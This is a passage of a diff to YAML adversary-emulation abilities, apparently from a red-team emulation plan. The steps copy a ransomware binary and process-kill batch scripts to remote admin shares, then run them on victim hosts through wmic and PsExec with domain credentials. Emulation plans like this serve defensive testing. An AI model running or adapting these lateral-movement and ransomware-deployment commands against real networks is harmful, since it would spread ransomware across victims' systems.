+    command: |
+      start copy sss.exe \\#{internal_IP}\c$\windows\temp\
 
 - id: e45dc48f-45f1-42d2-850c-4a15385c1646
   name: Copy Distribution Scripts
@@ -841,9 +840,9 @@
       default: 127.0.0.1
 
   executors:
-    - name: command_prompt
-      command: |
-        start copy xaa.bat \\#{internal_IP}\c$\windows\temp\
+  - name: command_prompt
+    command: |
+      start copy xaa.bat \\#{internal_IP}\c$\windows\temp\
 
 - id: 6ffca252-9eb0-4ac0-93dd-35c9e7c6fae0
   name: Copy Kill Scripts
@@ -871,9 +870,9 @@
       type: string
 
   executors:
-    - name: command_prompt
-      command: |
-        copy #{batch_file} \\#{internal_IP}\c$\windows\temp\
+  - name: command_prompt
+    command: |
+      copy #{batch_file} \\#{internal_IP}\c$\windows\temp\
 
 # Phase 2: Execution - Ransomware
 
@@ -891,11 +890,15 @@
     windows:
       cmd:
         command: |
-          start wmic /node:#{internal_IP} /user:#{domain_user} /password:#{password} process call create "cmd.exe /c copy \\#{internal_IP}\c$\windows\temp\sss.exe c:\windows\temp\"
+          start wmic /node:#{internal_IP} /user:#{domain_user} /password:#{password} process call create "cmd.exe /c copy \\#{distribution_server}\c$\windows\temp\sss.exe c:\windows\temp\"
 
   input_arguments:
     internal_IP:
-      description: Hostname or IP address
+      description: Hostname or IP address of remote (victim internal network) system
+      type: string
+      default: 127.0.0.1
+    distribution_server:
+      description: Hostname of IP address of distribution server
       type: string
       default: 127.0.0.1
     domain_user:
@@ -906,10 +909,10 @@
       type: string
 
   executors:
-    - name: command_prompt
-      elevation_required: true
-      command: |
-        start wmic /node:#{internal_IP} /user:#{domain_user} /password:#{password} process call create "cmd.exe /c copy \\#{internal_IP}\c$\windows\temp\sss.exe c:\windows\temp\"
+  - name: command_prompt
+    elevation_required: true
+    command: |
+      start wmic /node:#{internal_IP} /user:#{domain_user} /password:#{password} process call create "cmd.exe /c copy \\#{distribution_server}\c$\windows\temp\sss.exe c:\windows\temp\"
 
 - id: 5dcbd042-e8e5-4f3f-8055-7284e4d5112c
   name: Distribute Kill Scripts via WMI
@@ -925,11 +928,15 @@
     windows:
       cmd:
         command: |
-          start wmic /node:#{internal_IP} /user:#{domain_user} /password:#{password} process call create "cmd.exe /c copy \\#{internal_IP}\c$\windows\temp\#{batch_file} c:\windows\temp\"
+          start wmic /node:#{internal_IP} /user:#{domain_user} /password:#{password} process call create "cmd.exe /c copy \\#{distribution_server}\c$\windows\temp\#{batch_file} c:\windows\temp\"
 
   input_arguments:
     internal_IP:
-      description: Hostname or IP address
+      description: Hostname or IP address of remote (victim internal network) system
+      type: string
+      default: 127.0.0.1
+    distribution_server:
+      description: Hostname of IP address of distribution server
       type: string
       default: 127.0.0.1
     domain_user:
@@ -943,10 +950,10 @@
       type: string
 
   executors:
-    - name: command_prompt
-      elevation_required: true
-      command: |
-        start wmic /node:#{internal_IP} /user:#{domain_user} /password:#{password} process call create "cmd.exe /c copy \\#{internal_IP}\c$\windows\temp\#{batch_file} c:\windows\temp\"
+  - name: command_prompt
+    elevation_required: true
+    command: |
+      start wmic /node:#{internal_IP} /user:#{domain_user} /password:#{password} process call create "cmd.exe /c copy \\#{distribution_server}\c$\windows\temp\#{batch_file} c:\windows\temp\"
 
 - id: eb4c2ff6-3534-404c-bf1c-d864a508c162
   name: Execute Kill Scripts via WMI
@@ -980,10 +987,10 @@
       type: string
 
   executors:
-    - name: command_prompt
-      elevation_required: true
-      command: |
-        start wmic /node:#{internal_IP} /user:#{domain_user} /password:#{password} process call create "cmd /c c:\windows\temp\#{batch_file}"
+  - name: command_prompt
+    elevation_required: true
+    command: |
+      start wmic /node:#{internal_IP} /user:#{domain_user} /password:#{password} process call create "cmd /c c:\windows\temp\#{batch_file}"
 
 - id: c29e9cc7-b34f-46c2-bdbe-a41f757eae24
   name: Execute Ransomware via WMIC
@@ -1014,10 +1021,10 @@
       type: string
 
   executors:
-    - name: command_prompt
-      elevation_required: true
-      command: |
-        start wmic /node:#{internal_IP} /user:#{domain_user} /password:#{password} process call create "cmd /c c:\windows\temp\sss.exe"
+  - name: command_prompt
+    elevation_required: true
+    command: |
+      start wmic /node:#{internal_IP} /user:#{domain_user} /password:#{password} process call create "cmd /c c:\windows\temp\sss.exe"
 
 - id: 0c752dce-9302-4465-805f-522650aece3f
   name: Execute Kill Scripts via PsExec
@@ -1033,7 +1040,7 @@
     windows:
       cmd:
         command: |
-          start psexec.exe \\#{internal_IP} -u #{domain_user} -p #{password} -d -h -r rtrsd -s -accepteula -nobanner c:\windows\temp\#{batch_file}
+          start "#{psexec_exe}" \\#{internal_IP} -u #{domain_user} -p #{password} -d -h -r rtrsd -s -accepteula -nobanner c:\windows\temp\#{batch_file}
         payloads:
         - psexec.exe
 
@@ -1041,7 +1048,7 @@
     psexec_exe:
       description: Path to Psexec
       type: string
-      default: "C:\\PSTools\\PsExec.exe"    
+      default: C:\PSTools\PsExec.exe
     internal_IP:
       description: Hostname or IP address
       type: string
@@ -1057,10 +1064,10 @@
       type: string
 
   executors:
-    - name: command_prompt
-      elevation_required: true
-      command: |
-        start "#{psexec_exe}" \\#{internal_IP} -u #{domain_user} -p #{password} -d -h -r rtrsd -s -accepteula -nobanner c:\windows\temp\#{batch_file}
+  - name: command_prompt
+    elevation_required: true
+    command: |
+      start "#{psexec_exe}" \\#{internal_IP} -u #{domain_user} -p #{password} -d -h -r rtrsd -s -accepteula -nobanner c:\windows\temp\#{batch_file}
 
 - id: d77838f6-d562-3480-ad29-2cbeee8b7b45
   name: Execute Ransomware via PsExec
@@ -1076,7 +1083,7 @@
     windows:
       cmd:
         command: |
-          start psexec.exe \\#{internal_IP} -u #{domain_user} -p #{password} -d -h -r rtrsd -s -accepteula -nobanner c:\windows\temp\sss.exe
+          start "#{psexec_exe}" \\#{internal_IP} -u #{domain_user} -p #{password} -d -h -r rtrsd -s -accepteula -nobanner c:\windows\temp\sss.exe
         payloads:
         - psexec.exe
 
@@ -1084,7 +1091,7 @@
     psexec_exe:
       description: Path to Psexec
       type: string
-      default: "C:\\PSTools\\PsExec.exe"
+      default: C:\PSTools\PsExec.exe
     internal_IP:
       description: Hostname or IP address
       type: string
@@ -1097,7 +1104,7 @@
       type: string
 
   executors:
-    - name: command_prompt
-      elevation_required: true
-      command: |
-        start "#{psexec_exe}" \\#{internal_IP} -u #{domain_user} -p #{password} -d -h -r rtrsd -s -accepteula -nobanner c:\windows\temp\sss.exe
+  - name: command_prompt
+    elevation_required: true
+    command: |
+      start "#{psexec_exe}" \\#{internal_IP} -u #{domain_user} -p #{password} -d -h -r rtrsd -s -accepteula -nobanner c:\windows\temp\sss.exe
